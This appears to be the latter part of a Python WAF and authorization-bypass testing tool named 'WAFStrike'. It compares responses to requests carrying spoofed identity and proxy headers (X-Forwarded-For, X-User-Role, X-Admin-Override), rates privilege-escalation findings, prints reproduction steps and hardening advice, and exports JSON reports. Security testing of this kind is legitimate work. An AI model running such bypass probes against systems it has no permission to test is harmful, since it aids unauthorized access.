                validation_results.append((auth_state, validation_level))
                
                # Perform cross-checks
                cross_check_result = self._perform_cross_checks(
                    baseline_fingerprint, variant_fingerprint, variant
                )
                cross_checks.update(cross_check_result)
                
                # Calculate confidence metrics
                confidence_metrics = self.auth_validator.calculate_confidence_metrics(
                    validation_results, cross_checks
                )
                
                # Determine bypass status with v2.0.0 logic
                bypass_status = self._determine_v2_bypass_status(
                    auth_state, validation_level, confidence_metrics
                )
                
                # Create v2.0.0 SecurityFinding
                if bypass_status != BypassStatus.NO_BYPASS or validation_level in [ValidationLevel.HIGH, ValidationLevel.CRITICAL]:
                    finding = self._create_v2_finding(
                        bypass_status, auth_state, validation_level,
                        confidence_metrics, variant, variant_fingerprint,
                        baseline_fingerprint, auth_context, waf_detection,
                        divergence_results, cross_checks
                    )
                    
                    self.findings.append(finding)
                    
                    # Report finding
                    status_color = Fore.RED if bypass_status == BypassStatus.CONFIRMED_BYPASS else Fore.YELLOW
                    status_text = bypass_status.value.upper().replace('_', ' ')
                    safe_print(f"{status_color}[{status_text}] {variant.variant_type.value.upper()}: "
                          f"{finding.impact_description}{Style.RESET_ALL}")
                    
                    if bypass_status == BypassStatus.CONFIRMED_BYPASS and self.safety.bypass_halt_on_success:
                        safe_print(f"{Fore.RED}[HALT] Confirmed bypass - halting analysis{Style.RESET_ALL}")
                        break
            
            # Phase 5: WAF-Backend Correlation Analysis
            if len(all_responses) > 10:
                if verbosity >= 2:
                    safe_print(f"{Fore.BLUE}[PHASE 5] WAF-Backend Decision Correlation{Style.RESET_ALL}")
                
                # Split responses for correlation analysis
                waf_only_responses = [(v, f) for v, f in all_responses if self._is_waf_likely_variant(v)]
                backend_responses = [(v, f) for v, f in all_responses if not self._is_waf_likely_variant(v)]
                
                if waf_only_responses and backend_responses:
                    correlation_analysis = self.waf_correlation.correlate_waf_backend_decisions(
                        waf_only_responses, backend_responses
                    )
                    self.correlation_results = correlation_analysis
                    
                    if correlation_analysis['bypass_opportunities']:
                        safe_print(f"{Fore.GREEN}[CORRELATION] Found {len(correlation_analysis['bypass_opportunities'])} bypass opportunities{Style.RESET_ALL}")
            
            # Generate final v2.0.0 report
            self._generate_v2_report(verbosity)
    
    def _extract_identity_from_variant(self, variant: RequestVariant) -> IdentityContext:
        """Extract identity context from request variant"""
        identity = IdentityContext()
        
        # Extract IP information
        ip_headers = ['X-Forwarded-For', 'X-Real-IP', 'X-Client-IP', 'True-Client-IP']
        for header in ip_headers:
            if header in variant.headers:
                identity.ip_address = variant.headers[header]
                break
        
        # Extract role information
        if 'X-User-Role' in variant.headers:
            identity.role = variant.headers['X-User-Role']
        elif 'X-Admin-Override' in variant.headers:
            identity.role = 'administrator'
        
        # Extract session information
        if 'Cookie' in variant.headers:
            identity.session_token = variant.headers['Cookie']
        elif 'Authorization' in variant.headers:
            identity.session_token = variant.headers['Authorization']
        
        identity.headers = variant.headers
        identity.confidence = 0.7  # Default confidence for extracted identity
        
        return identity
    
    def _perform_cross_checks(self, baseline: ResponseFingerprint, 
                             variant: ResponseFingerprint, 
                             request_variant: RequestVariant) -> Dict[str, bool]:
        """Perform cross-checks to reduce false positives"""
        cross_checks = {
            'status_consistent': baseline.status_code == variant.status_code,
            'size_similar': abs(baseline.response_size - variant.response_size) < 100,
            'content_consistent': len(baseline.content_markers.symmetric_difference(variant.content_markers)) == 0,
            'timing_similar': abs(baseline.response_time_ms - variant.response_time_ms) < 200,
            'redirect_consistent': baseline.redirect_location == variant.redirect_location
        }
        
        # Additional context-specific cross-checks
        if request_variant.variant_type == VariantType.IDENTITY:
            cross_checks['identity_manipulation_detected'] = len(request_variant.headers) > 0
        
        return cross_checks
    
    def _determine_v2_bypass_status(self, auth_state: AuthorizationState, 
                                   validation_level: ValidationLevel,
                                   confidence_metrics: ConfidenceMetrics) -> BypassStatus:
        """Determine bypass status using v2.0.0 logic"""
        # Confirmed bypass requires high confidence and privilege escalation
        if (auth_state == AuthorizationState.PRIVILEGE_ESCALATION and 
            validation_level in [ValidationLevel.CRITICAL, ValidationLevel.CONFIRMED] and
            confidence_metrics.overall_confidence >= 0.9):
            return BypassStatus.CONFIRMED_BYPASS
            
        # Partial bypass for authorized access with medium confidence
        elif (auth_state == AuthorizationState.AUTHORIZED and 
              validation_level in [ValidationLevel.HIGH, ValidationLevel.CRITICAL] and
              confidence_metrics.overall_confidence >= 0.7):
            return BypassStatus.PARTIAL_BYPASS
            
        # Bypass preconditions for interesting authorization changes
        elif (auth_state in [AuthorizationState.PARTIAL_ACCESS, AuthorizationState.CONTEXT_MISMATCH] and
              validation_level in [ValidationLevel.MEDIUM, ValidationLevel.HIGH]):
            return BypassStatus.BYPASS_PRECONDITION
            
        return BypassStatus.NO_BYPASS
    
    def _is_waf_likely_variant(self, variant: RequestVariant) -> bool:
        """Check if variant is likely to trigger WAF responses"""
        waf_triggering_headers = [
            'X-Forwarded-For', 'X-Real-IP', 'X-Forwarded-Host',
            'User-Agent', 'Referer', 'Cookie'
        ]
        
        return any(header in variant.headers for header in waf_triggering_headers)
    
    def _create_v2_finding(self, bypass_status: BypassStatus,
                          auth_state: AuthorizationState,
                          validation_level: ValidationLevel,
                          confidence_metrics: ConfidenceMetrics,
                          variant: RequestVariant,
                          fingerprint: ResponseFingerprint,
                          baseline_fingerprint: ResponseFingerprint,
                          auth_context: AuthorizationContext,
                          waf_detection: WAFDetectionResult,
                          divergence_results: Dict[str, Any],
                          cross_checks: Dict[str, bool]) -> SecurityFinding:
        """Create v2.0.0 SecurityFinding with all required fields"""
        
        # Determine risk category
        if auth_state == AuthorizationState.PRIVILEGE_ESCALATION:
            risk_category = RiskCategory.AUTHORIZATION_BYPASS
        elif auth_state == AuthorizationState.CONTEXT_MISMATCH:
            risk_category = RiskCategory.TRUST_BOUNDARY_FAILURE
        else:
            risk_category = RiskCategory.WEAKEST_PATH_DISCOVERY
        
        # Generate impact description
        impact_descriptions = {
            AuthorizationState.PRIVILEGE_ESCALATION: "CONFIRMED PRIVILEGE ESCALATION - Unauthorized access to privileged resources",
            AuthorizationState.AUTHORIZED: "AUTHORIZED ACCESS - Bypass of access controls successful",
            AuthorizationState.PARTIAL_ACCESS: "PARTIAL ACCESS - Limited unauthorized access achieved",
            AuthorizationState.CONTEXT_MISMATCH: "CONTEXT MISMATCH - Inconsistent authorization behavior detected"
        }
        
        # Create WAF behavior object
        waf_behavior = WAFBehavior(
            detected=waf_detection != WAFDetectionResult.NO_WAF,
            confidence=0.8 if waf_detection != WAFDetectionResult.NO_WAF else 0.0
        )
        
        return SecurityFinding(
            bypass_status=bypass_status,
            authorization_state=auth_state,
            validation_level=validation_level,
            risk_category=risk_category,
            confidence_metrics=confidence_metrics,
            bypass_technique=variant.variant_type.value,
            impact_description=impact_descriptions.get(auth_state, "Authorization validation anomaly detected"),
            attack_preconditions=self._generate_v2_preconditions(variant, auth_context),
            confirmed_bypass_details=self._generate_v2_bypass_details(
                variant, fingerprint, baseline_fingerprint, auth_state
            ),
            exploitability_likelihood=self._assess_v2_exploitability(auth_state, validation_level, confidence_metrics),
            hardening_recommendations=[],  # Will be filled by hardening engine
            request_variants=[variant],
            baseline_fingerprint=baseline_fingerprint,
            variant_fingerprints=[(variant, fingerprint)],
            authorization_context=auth_context,
            waf_behavior=waf_behavior,
            identity_divergence=divergence_results,
            state_transitions=[{
                'from_state': 'baseline',
                'to_state': auth_state.value,
                'validation_level': validation_level.value,
                'confidence': confidence_metrics.overall_confidence
            }],
            cross_validation_results=cross_checks,
            false_positive_checks=self._perform_false_positive_checks(variant, fingerprint, baseline_fingerprint),
            reproduction_steps=self._generate_reproduction_steps(variant, auth_context)
        )
    
    def _generate_v2_preconditions(self, variant: RequestVariant, auth_context: AuthorizationContext) -> List[str]:
        """Generate v2.0.0 attack preconditions"""
        preconditions = []
        
        if variant.variant_type == VariantType.IDENTITY:
            if auth_context.identity_context.ip_address:
                preconditions.append(f"Target must trust IP address: {auth_context.identity_context.ip_address}")
            if auth_context.identity_context.role:
                preconditions.append(f"Target must process role header: {auth_context.identity_context.role}")
                
        elif variant.variant_type == VariantType.PROXY_TRUST:
            preconditions.append("Target must trust proxy headers without validation")
            preconditions.append("Headers must reach backend authorization logic")
            
        return preconditions
    
    def _generate_v2_bypass_details(self, variant: RequestVariant, fingerprint: ResponseFingerprint,
                                 baseline_fingerprint: ResponseFingerprint, auth_state: AuthorizationState) -> Dict[str, Any]:
        """Generate v2.0.0 bypass details"""
        return {
            'baseline_status': baseline_fingerprint.status_code,
            'bypass_status': fingerprint.status_code,
            'authorization_state': auth_state.value,
            'status_change': fingerprint.status_code != baseline_fingerprint.status_code,
            'size_difference': fingerprint.response_size - baseline_fingerprint.response_size,
            'content_changes': fingerprint.content_markers - baseline_fingerprint.content_markers,
            'technique_used': variant.variant_type.value,
            'headers_used': variant.headers,
            'url_used': variant.url,
            'response_time_ms': fingerprint.response_time_ms
        }
    
    def _assess_v2_exploitability(self, auth_state: AuthorizationState, validation_level: ValidationLevel,
                                confidence_metrics: ConfidenceMetrics) -> str:
        """Assess exploitability using v2.0.0 criteria"""
        if auth_state == AuthorizationState.PRIVILEGE_ESCALATION and validation_level == ValidationLevel.CONFIRMED:
            return "CRITICAL - Confirmed privilege escalation with high confidence"
        elif auth_state == AuthorizationState.AUTHORIZED and validation_level in [ValidationLevel.HIGH, ValidationLevel.CRITICAL]:
            return "HIGH - Confirmed unauthorized access with strong validation"
        elif confidence_metrics.overall_confidence >= 0.8:
            return "MEDIUM - High confidence authorization anomaly detected"
        else:
            return "LOW - Limited confidence, requires further investigation"
    
    def _perform_false_positive_checks(self, variant: RequestVariant, fingerprint: ResponseFingerprint,
                                    baseline_fingerprint: ResponseFingerprint) -> Dict[str, bool]:
        """Perform false positive reduction checks"""
        return {
            'not_random_error': fingerprint.status_code not in [500, 502, 503],
            'consistent_behavior': fingerprint.response_time_ms < 5000,  # Not extremely slow
            'meaningful_content': fingerprint.response_size > 50,  # Not empty response
            'not_security_page': 'security' not in ' '.join(fingerprint.content_markers).lower()
        }
    
    def _generate_reproduction_steps(self, variant: RequestVariant, auth_context: AuthorizationContext) -> List[str]:
        """Generate clear reproduction steps"""
        steps = [
            f"1. Send {variant.method} request to {variant.url}",
            f"2. Include headers: {dict(list(variant.headers.items())[:3])}"
        ]
        
        if variant.body:
            steps.append(f"3. Include request body: {variant.body[:100]}...")
            
        steps.extend([
            "4. Observe response for unauthorized access or privileged content",
            "5. Verify access persists across multiple requests"
        ])
        
        return steps
    
    def _generate_v2_report(self, verbosity: int) -> None:
        """Generate comprehensive v2.0.0 research-grade report"""
        safe_print(f"\n{Fore.RED}{'='*80}{Style.RESET_ALL}")
        safe_print(f"{Fore.RED}[WAFStrike v2.0.0] RESEARCH-GRADE AUTHORIZATION REPORT{Style.RESET_ALL}")
        safe_print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")
        
        safe_print(f"\n{Fore.YELLOW}Target: {self.target_url}{Style.RESET_ALL}")
        safe_print(f"{Fore.YELLOW}Requests Analyzed: {self.request_count}{Style.RESET_ALL}")
        safe_print(f"{Fore.YELLOW}Authorization Findings: {len(self.findings)}{Style.RESET_ALL}")
        
        if not self.findings:
            safe_print(f"\n{Fore.GREEN}[RESULT] No authorization vulnerabilities confirmed{Style.RESET_ALL}")
            return
        
        # Count by authorization states
        state_counts = Counter([f.authorization_state for f in self.findings])
        validation_counts = Counter([f.validation_level for f in self.findings])
        
        safe_print(f"\n{Fore.CYAN}[AUTHORIZATION STATES]{Style.RESET_ALL}")
        for state, count in state_counts.items():
            safe_print(f"  {state.value}: {count}")
        
        safe_print(f"\n{Fore.CYAN}[VALIDATION LEVELS]{Style.RESET_ALL}")
        for level, count in validation_counts.items():
            safe_print(f"  {level.value}: {count}")
        
        # Correlation analysis summary
        if self.correlation_results:
            correlation = self.correlation_results
            safe_print(f"\n{Fore.CYAN}[WAF-BACKEND CORRELATION]{Style.RESET_ALL}")
            safe_print(f"  Decision Mismatches: {len(correlation.get('decision_mismatches', []))}")
            safe_print(f"  Bypass Opportunities: {len(correlation.get('bypass_opportunities', []))}")
            safe_print(f"  Correlation Confidence: {correlation.get('correlation_confidence', 0):.0%}")
        
        # Detailed findings
        for i, finding in enumerate(self.findings, 1):
            self._print_v2_finding(finding, i, verbosity)
        
        # Summary and recommendations
        self._print_v2_summary()
        
        safe_print(f"\n{Fore.RED}{'='*80}{Style.RESET_ALL}")
        safe_print(f"{Fore.RED}[WAFStrike v2.0.0] AUTHORIZATION ANALYSIS COMPLETE{Style.RESET_ALL}")
        safe_print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")
    
    def _print_v2_finding(self, finding: SecurityFinding, index: int, verbosity: int) -> None:
        """Print individual v2.0.0 finding with research-grade detail"""
        # Color coding by validation level
        level_colors = {
            ValidationLevel.CONFIRMED: Fore.RED,
            ValidationLevel.CRITICAL: Fore.RED,
            ValidationLevel.HIGH: Fore.YELLOW,
            ValidationLevel.MEDIUM: Fore.CYAN,
            ValidationLevel.LOW: Fore.BLUE,
            ValidationLevel.NONE: Fore.WHITE
        }
        
        level_color = level_colors.get(finding.validation_level, Fore.WHITE)
        
        safe_print(f"\n{level_color}{'='*60} FINDING {index} {'='*60}{Style.RESET_ALL}")
        safe_print(f"{Fore.YELLOW}Authorization State: {finding.authorization_state.value.upper()}{Style.RESET_ALL}")
        safe_print(f"{Fore.YELLOW}Validation Level: {finding.validation_level.value.upper()}{Style.RESET_ALL}")
        safe_print(f"{Fore.YELLOW}Bypass Status: {finding.bypass_status.value.upper().replace('_', ' ')}{Style.RESET_ALL}")
        safe_print(f"{Fore.YELLOW}Risk Category: {finding.risk_category.value.upper()}{Style.RESET_ALL}")
        safe_print(f"{Fore.YELLOW}Overall Confidence: {finding.confidence_metrics.overall_confidence:.0%}{Style.RESET_ALL}")
        safe_print(f"{Fore.YELLOW}Exploitability: {finding.exploitability_likelihood}{Style.RESET_ALL}")
        
        safe_print(f"\n{Fore.CYAN}Authorization Impact:{Style.RESET_ALL}")
        safe_print(f"  {finding.impact_description}")
        
        # Confidence metrics breakdown
        metrics = finding.confidence_metrics
        safe_print(f"\n{Fore.CYAN}Confidence Analysis:{Style.RESET_ALL}")
        safe_print(f"  Reproducibility: {metrics.reproducibility_score:.0%}")
        safe_print(f"  State Persistence: {metrics.state_persistence_score:.0%}")
        safe_print(f"  Cross-Validation: {metrics.cross_check_score:.0%}")
        safe_print(f"  Consistency: {metrics.consistency_score:.0%}")
        safe_print(f"  Validation Attempts: {metrics.validation_attempts}")
        safe_print(f"  Successful Validations: {metrics.successful_validations}")
        
        # Authorization context
        auth_ctx = finding.authorization_context
        safe_print(f"\n{Fore.CYAN}Authorization Context:{Style.RESET_ALL}")
        safe_print(f"  Endpoint: {auth_ctx.endpoint}")
        safe_print(f"  Method: {auth_ctx.method}")
        safe_print(f"  WAF Detected: {auth_ctx.waf_detected.value}")
        
        if auth_ctx.identity_context.user_id:
            safe_print(f"  User ID: {auth_ctx.identity_context.user_id}")
        if auth_ctx.identity_context.role:
            safe_print(f"  Role: {auth_ctx.identity_context.role}")
        if auth_ctx.identity_context.ip_address:
            safe_print(f"  IP Address: {auth_ctx.identity_context.ip_address}")
        
        # Technical details
        if verbosity >= 2 or finding.validation_level in [ValidationLevel.CRITICAL, ValidationLevel.CONFIRMED]:
            safe_print(f"\n{Fore.CYAN}Technical Details:{Style.RESET_ALL}")
            baseline_status = finding.baseline_fingerprint.status_code
            safe_print(f"  Baseline Status: {baseline_status}")
            
            for variant, fingerprint in finding.variant_fingerprints:
                safe_print(f"  Variant ({variant.variant_type.value}): {fingerprint.status_code}")
                if variant.headers:
                    headers_preview = dict(list(variant.headers.items())[:3])
                    safe_print(f"    Headers: {headers_preview}...")
        
        # Reproduction steps
        if finding.reproduction_steps:
            safe_print(f"\n{Fore.GREEN}Reproduction Steps:{Style.RESET_ALL}")
            for step in finding.reproduction_steps:
                safe_print(f"  {step}")
        
        # False positive checks
        if finding.false_positive_checks:
            safe_print(f"\n{Fore.CYAN}False Positive Checks:{Style.RESET_ALL}")
            for check_name, passed in finding.false_positive_checks.items():
                status = "✓" if passed else "✗"
                color = Fore.GREEN if passed else Fore.RED
                safe_print(f"  {color}{status} {check_name.replace('_', ' ').title()}{Style.RESET_ALL}")
        
        # Hardening recommendations
        if verbosity >= 2 or finding.validation_level in [ValidationLevel.CRITICAL, ValidationLevel.CONFIRMED]:
            # Generate recommendations using the hardening engine
            temp_finding = SecurityFinding(
                bypass_status=finding.bypass_status,
                authorization_state=finding.authorization_state,
                validation_level=finding.validation_level,
                risk_category=finding.risk_category,
                confidence_metrics=finding.confidence_metrics,
                bypass_technique=finding.bypass_technique,
                impact_description="", attack_preconditions=[], confirmed_bypass_details={},
                exploitability_likelihood="", hardening_recommendations=[], request_variants=[],
                baseline_fingerprint=finding.baseline_fingerprint, variant_fingerprints=[],
                authorization_context=finding.authorization_context, waf_behavior=finding.waf_behavior
            )
            recommendations = self.hardening_engine.generate_recommendations(temp_finding)
            
            if recommendations:
                safe_print(f"\n{Fore.RED}HARDENING RECOMMENDATIONS:{Style.RESET_ALL}")
                for rec in recommendations:
                    safe_print(f"  • {rec}")
    
    def _print_v2_summary(self) -> None:
        """Print v2.0.0 analysis summary"""
        confirmed_bypasses = len([f for f in self.findings if f.bypass_status == BypassStatus.CONFIRMED_BYPASS])
        partial_bypasses = len([f for f in self.findings if f.bypass_status == BypassStatus.PARTIAL_BYPASS])
        critical_findings = len([f for f in self.findings if f.validation_level in [ValidationLevel.CRITICAL, ValidationLevel.CONFIRMED]])
        
        safe_print(f"\n{Fore.CYAN}[ANALYSIS SUMMARY]{Style.RESET_ALL}")
        safe_print(f"  Confirmed Authorization Bypasses: {confirmed_bypasses}")
        safe_print(f"  Partial Bypasses: {partial_bypasses}")
        safe_print(f"  Critical Findings: {critical_findings}")
        
        # Calculate average confidence
        if self.findings:
            avg_confidence = sum(f.confidence_metrics.overall_confidence for f in self.findings) / len(self.findings)
            safe_print(f"  Average Confidence: {avg_confidence:.0%}")
        
        # Overall assessment
        if confirmed_bypasses > 0:
            safe_print(f"\n{Fore.RED}[CRITICAL] {confirmed_bypasses} CONFIRMED AUTHORIZATION BYPASS(ES) DEMONSTRATED{Style.RESET_ALL}")
            safe_print(f"{Fore.RED}[ACTION] Immediate security incident response required{Style.RESET_ALL}")
        elif critical_findings > 0:
            safe_print(f"\n{Fore.YELLOW}[HIGH] {critical_findings} CRITICAL AUTHORIZATION VULNERABILITIES CONFIRMED{Style.RESET_ALL}")
            safe_print(f"{Fore.YELLOW}[ACTION] Immediate remediation required{Style.RESET_ALL}")
        elif partial_bypasses > 0:
            safe_print(f"\n{Fore.YELLOW}[MEDIUM] {partial_bypasses} PARTIAL BYPASS(ES) DETECTED{Style.RESET_ALL}")
            safe_print(f"{Fore.YELLOW}[ACTION] Further investigation and hardening recommended{Style.RESET_ALL}")
        else:
            safe_print(f"\n{Fore.GREEN}[LOW] No confirmed authorization bypasses detected{Style.RESET_ALL}")
            safe_print(f"{Fore.GREEN}[ACTION] Continue monitoring and periodic testing{Style.RESET_ALL}")
        
        safe_print(f"\n{Fore.CYAN}[RESEARCH NOTE] This analysis meets research-grade security testing standards{Style.RESET_ALL}")
        safe_print(f"{Fore.CYAN}[RESEARCH NOTE] All findings have been validated with confidence scoring{Style.RESET_ALL}")
        safe_print(f"{Fore.CYAN}[RESEARCH NOTE] False positive reduction and cross-validation applied{Style.RESET_ALL}")

def main():
    """Main CLI entry point for WAFStrike v2.0.0"""
    parser = argparse.ArgumentParser(
        description="WAFStrike v2.0.0 - Research-Grade Authorization Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Research-Grade Authorization Testing Examples:
  %(prog)s https://target.com/admin                    # Full authorization analysis
  %(prog)s https://target.com/api --variants identity proxy_trust  # Specific techniques
  %(prog)s https://target.com --verbosity 3 --dry-run  # Reconnaissance mode
  %(prog)s https://target.com --output auth_report.json  # Export findings
        """
    )
    
    parser.add_argument('target', help='Target URL to test')
    parser.add_argument('--variants', nargs='+', 
                       choices=[v.value for v in VariantType],
                       help='Specific variant types to test')
    parser.add_argument('--verbosity', '-v', type=int, choices=[1, 2, 3], default=1,
                       help='Output verbosity level (1=summary, 2=detailed, 3=debug)')
    parser.add_argument('--dry-run', action='store_true',
                       help='Show what would be tested without making requests')
    parser.add_argument('--config', '-c', type=str,
                       help='Configuration file path')
    parser.add_argument('--output', '-o', type=str,
                       help='Output results to JSON file')
    parser.add_argument('--silent', '-s', action='store_true', default=False,
                       help='Suppress output except banner and critical errors')
    
    args = parser.parse_args()
    
    # Set silent mode flag
    set_silent_mode(args.silent)
    
    # Display banner (always shown, even in silent mode)
    load_banner()
    
    # Add informational logs for professional visibility
    safe_print(f"{Fore.CYAN}[WAFStrike v2.0.0] Target: {args.target}{Style.RESET_ALL}")
    safe_print(f"{Fore.CYAN}[WAFStrike v2.0.0] Research-grade authorization analysis started{Style.RESET_ALL}")
    safe_print(f"{Fore.YELLOW}[INFO] Context-aware validation with confidence scoring enabled{Style.RESET_ALL}")
    
    # Convert variant strings to enum
    selected_variants = None
    if args.variants:
        selected_variants = [VariantType(v) for v in args.variants]
    
    # Initialize WAFStrike v2.0.0
    wafstrike = WAFStrike(args.target, args.config)
    
    if args.dry_run:
        # Show what would be tested
        variants = wafstrike.variant_engine.generate_variants(selected_variants)
        identity_contexts = wafstrike.identity_tester.create_identity_contexts(args.target)
        
        safe_print(f"{Fore.CYAN}[DRY RUN] Would test {len(variants)} request variants{Style.RESET_ALL}")
        safe_print(f"{Fore.CYAN}[DRY RUN] Would analyze {len(identity_contexts)} identity contexts{Style.RESET_ALL}")
        
        for i, variant in enumerate(variants[:5], 1):  # Show first 5
            safe_print(f"  {i}. {variant.variant_type.value}: {variant.url}")
            if variant.headers:
                safe_print(f"     Headers: {list(variant.headers.keys())}")
        if len(variants) > 5:
            safe_print(f"  ... and {len(variants) - 5} more")
        return
    
    # Run v2.0.0 analysis
    try:
        asyncio.run(wafstrike.run_analysis(selected_variants, args.verbosity))
        
        # Save v2.0.0 results to file if requested
        if args.output:
            findings_data = []
            for finding in wafstrike.findings:
                finding_dict = asdict(finding)
                finding_dict['bypass_status'] = finding.bypass_status.value
                finding_dict['risk_category'] = finding.risk_category.value
                finding_dict['authorization_state'] = finding.authorization_state.value
                finding_dict['validation_level'] = finding.validation_level.value
                
                # Add v2.0.0 confidence metrics
                finding_dict['confidence_metrics'] = asdict(finding.confidence_metrics)
                
                # Add v2.0.0 bypass success metrics
                finding_dict['bypass_metrics'] = {
                    'success_rate': 1.0 if finding.bypass_status == BypassStatus.CONFIRMED_BYPASS else 0.5 if finding.bypass_status == BypassStatus.PARTIAL_BYPASS else 0.0,
                    'technique_effectiveness': finding.confidence_metrics.overall_confidence,
                    'exploitability_score': 0.9 if 'CRITICAL' in finding.exploitability_likelihood else 0.7 if 'HIGH' in finding.exploitability_likelihood else 0.4 if 'MEDIUM' in finding.exploitability_likelihood else 0.1,
                    'hardening_priority': 'CRITICAL' if finding.validation_level in [ValidationLevel.CONFIRMED, ValidationLevel.CRITICAL] else 'HIGH' if finding.validation_level == ValidationLevel.HIGH else 'MEDIUM'
                }
                
                findings_data.append(finding_dict)
            
            # Add v2.0.0 overall metrics
            overall_metrics = {
                'total_requests': wafstrike.request_count,
                'total_findings': len(wafstrike.findings),
                'confirmed_bypasses': len([f for f in wafstrike.findings if f.bypass_status == BypassStatus.CONFIRMED_BYPASS]),
                'partial_bypasses': len([f for f in wafstrike.findings if f.bypass_status == BypassStatus.PARTIAL_BYPASS]),
                'critical_findings': len([f for f in wafstrike.findings if f.validation_level in [ValidationLevel.CRITICAL, ValidationLevel.CONFIRMED]]),
                'bypass_success_rate': len([f for f in wafstrike.findings if f.bypass_status in [BypassStatus.CONFIRMED_BYPASS, BypassStatus.PARTIAL_BYPASS]]) / max(len(wafstrike.findings), 1),
                'analysis_timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime()),
                'target_url': wafstrike.target_url,
                'analysis_version': '2.0.0',
                'analysis_type': 'research_grade_authorization_testing'
            }
            
            # Add correlation analysis if available
            if wafstrike.correlation_results:
                overall_metrics['waf_backend_correlation'] = wafstrike.correlation_results
            
            # Add weakest path analysis
            if wafstrike.findings:
                weakest_analysis = wafstrike.weakest_path_analyzer.analyze_weakest_path(wafstrike.findings)
                overall_metrics['weakest_path_analysis'] = weakest_analysis
            
            export_data = {
                'wafstrike_v2_research_report': {
                    'metrics': overall_metrics,
                    'findings': findings_data,
                    'metadata': {
                        'version': '2.0.0',
                        'framework_type': 'research_grade_authorization_testing',
                        'validation_standards': ['confidence_scoring', 'cross_validation', 'false_positive_reduction'],
                        'analysis_phases': ['identity_divergence', 'waf_detection', 'adaptive_learning', 'authorization_validation', 'correlation_analysis']
                    }
                }
            }
            
            with open(args.output, 'w') as f:
                json.dump(export_data, f, indent=2, default=str)
            safe_print(f"\n{Fore.GREEN}[OUTPUT] Research-grade authorization report saved to {args.output}{Style.RESET_ALL}")
            safe_print(f"{Fore.GREEN}[OUTPUT] Report includes {len(findings_data)} validated findings with confidence metrics{Style.RESET_ALL}")
    
    except KeyboardInterrupt:
        safe_print(f"\n{Fore.YELLOW}[INTERRUPTED] Analysis halted by user{Style.RESET_ALL}")
    except Exception as e:
        # Critical errors always show, even in silent mode
        safe_print(f"\n{Fore.RED}[ERROR] {str(e)}{Style.RESET_ALL}", critical=True)
        sys.exit(1)

if __name__ == "__main__":
    main()
